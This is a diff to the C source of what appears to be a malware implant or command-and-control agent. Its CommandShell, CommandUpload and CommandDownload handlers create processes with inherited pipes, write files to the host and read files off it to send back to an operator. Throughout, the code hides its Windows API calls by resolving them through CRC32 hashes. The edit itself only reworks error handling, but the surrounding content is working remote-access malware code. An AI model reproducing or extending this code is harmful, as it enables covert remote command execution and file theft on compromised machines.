@@ -1,4 +1,5 @@
 #include "Asm.h"
+#include "Dbg.h"
 #include "Defs.h"
 #include "Core.h"
 #include "Poly.h"
@@ -202,7 +203,7 @@ VOID CommandShell( PPARSER Parser ){
 
     // create process params struct
     RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
-    p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01);
+    check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01) == 0, "RtlCreateProcessParametersEx Failed!");
 
     // create info struct
     PS_CREATE_INFO create_info = { 0 };
@@ -226,11 +227,11 @@ VOID CommandShell( PPARSER Parser ){
     RtlAllocateHeap_t p_RtlAllocateHeap = (RtlAllocateHeap_t) GetProcAddressByHash(p_ntdll, RtlAllocateHeap_CRC32B);
 
     // get heaps
-    RtlGetProcessHeaps_t p_RtlGetProcessHeaps = (RtlGetProcessHeaps_t) GetProcAddressByHash(p_ntdll, RtlGetProcessHeaps_CRC32B);
+    // RtlGetProcessHeaps_t p_RtlGetProcessHeaps = (RtlGetProcessHeaps_t) GetProcAddressByHash(p_ntdll, RtlGetProcessHeaps_CRC32B);
 
     // make attributes
-    OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
-    PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
+    // OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
+    // PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
     PCLIENT_ID client_id = (PCLIENT_ID)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
     PPS_ATTRIBUTE_LIST attrib_list = (PS_ATTRIBUTE_LIST *)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
     PSECTION_IMAGE_INFORMATION sec_img_info = (PSECTION_IMAGE_INFORMATION)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
@@ -244,17 +245,15 @@ VOID CommandShell( PPARSER Parser ){
     HANDLE h_proc, h_thread = NULL;
     NtCreateUserProcess_t p_NtCreateUserProcess = (NtCreateUserProcess_t) GetProcAddressByHash(p_ntdll, NtCreateUserProcess_CRC32B);
 
-    if((status = p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list)) != 0x0) {
-        // _tprintf("PROCESS CREATION FAILED!\n");
-        // _tprintf("STATUS:%08x\n", status);
-        __asm("nop;"); //TODO: ERROR HANDLING
-    }
+    check_debug(p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list) == 0, "NtCreateUserProcess Failed!");
+
     RtlFreeHeap_t p_RtlFreeHeap = (RtlFreeHeap_t) GetProcAddressByHash(p_ntdll, RtlFreeHeap_CRC32B);
 
     p_RtlFreeHeap(RtlProcessHeap(), 0, attrib_list);
     p_RtlFreeHeap(RtlProcessHeap(), 0, sec_img_info);
     p_RtlFreeHeap(RtlProcessHeap(), 0, client_id);
 
+    LEAVE:
     LocalFree(*(PVOID *)wide_command);
     LocalFree(*(PVOID *)wide_args);
     LocalFree(*(PVOID *)command_array);
@@ -264,6 +263,7 @@ VOID CommandShell( PPARSER Parser ){
     RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
 
     p_RtlDestroyProcessParameters(proc_params);
+
 
     CloseHandle( hStdOutPipeWrite );
     CloseHandle( hStdInPipeRead );
@@ -376,13 +376,13 @@ VOID CommandUpload( PPARSER Parser ) {
                                  FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
                                  0)) != 0x0) {
         //_tprintf("[*] NtCreateFile: Failed[0x%lx]\n", status);
-        goto Cleanup;
+        goto LEAVE;
     }
 
     NtWriteFile_t p_NtWriteFile = GetProcAddressByHash(p_ntdll, NtWriteFile_CRC32B);
     if ((status = p_NtWriteFile(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize-1, 0, 0)) != 0x0) {
         //_tprintf("[*] NtWriteFile: Failed[0x%lx]\n", status);
-        goto Cleanup;
+        goto LEAVE;
     }
 
     Written = io_status_block.Information;
@@ -391,7 +391,7 @@ VOID CommandUpload( PPARSER Parser ) {
     PackageAddBytes(Package, (PUCHAR) FileName, NameSize);
     PackageTransmit(Package, NULL, NULL);
 
-    Cleanup:
+    LEAVE:
     CloseHandle(hFile);
     hFile = NULL;
 
@@ -415,19 +415,19 @@ VOID CommandUpload( PPARSER Parser ) {
 
     if ( hFile == INVALID_HANDLE_VALUE ) {
         // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
-        goto Cleanup;
+        goto LEAVE;
     }
 
     if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL)) {
         // _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
-        goto Cleanup;
+        goto LEAVE;
     }
 
     PackageAddInt32( Package, FileSize );
     PackageAddBytes( Package, (PUCHAR)FileName, NameSize );
     PackageTransmit( Package, NULL, NULL );
 
-    Cleanup:
+    LEAVE:
     CloseHandle( hFile );
     hFile = NULL;
 #endif // CONFIG_NATIVE
@@ -491,14 +491,14 @@ VOID CommandDownload( PPARSER Parser ) {
 
     if((status = p_NtOpenFile(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT)) != 0){
         //_tprintf("NtOpenFile: 0x%lx\n", status);
-        goto CleanupDownload;
+        goto LEAVE;
     }
 
     FILE_STANDARD_INFORMATION file_standard_info;
     NtQueryInformationFile_t p_NtQueryInformationFile = GetProcAddressByHash(p_ntdll, NtQueryInformationFile_CRC32B);
     if((status = p_NtQueryInformationFile(hFile, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0) {
         // _tprintf("NtQueryInformationFile failed with status: 0x%lx\n", status);
-        goto CleanupDownload;
+        goto LEAVE;
     }
 
     FileSize = file_standard_info.EndOfFile.QuadPart;
@@ -508,7 +508,7 @@ VOID CommandDownload( PPARSER Parser ) {
     NtReadFile_t p_NtReadFile = GetProcAddressByHash(p_ntdll, NtReadFile_CRC32B);
     if((status = p_NtReadFile(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize, NULL, NULL)) != 0x0) {
         // _tprintf("NtReadFile failed with status: 0x%lx\n", status);
-        goto CleanupDownload;
+        goto LEAVE;
     }
 
     Read += io_status_block.Information;
@@ -540,7 +540,7 @@ VOID CommandDownload( PPARSER Parser ) {
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
     {
         // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
-        goto CleanupDownload;
+        goto LEAVE;
     }
 
     FileSize = GetFileSize( hFile, 0 );
@@ -549,7 +549,7 @@ VOID CommandDownload( PPARSER Parser ) {
     if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
     {
         // _tprintf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
-        goto CleanupDownload;
+        goto LEAVE;
     }
 
     PackageAddBytes( Package, FileName, NameSize );
@@ -558,7 +558,7 @@ VOID CommandDownload( PPARSER Parser ) {
     PackageTransmit( Package, NULL, NULL );
 #endif
 
-    CleanupDownload:
+    LEAVE:
     if ( hFile ){
         CloseHandle( hFile );
         hFile = NULL;
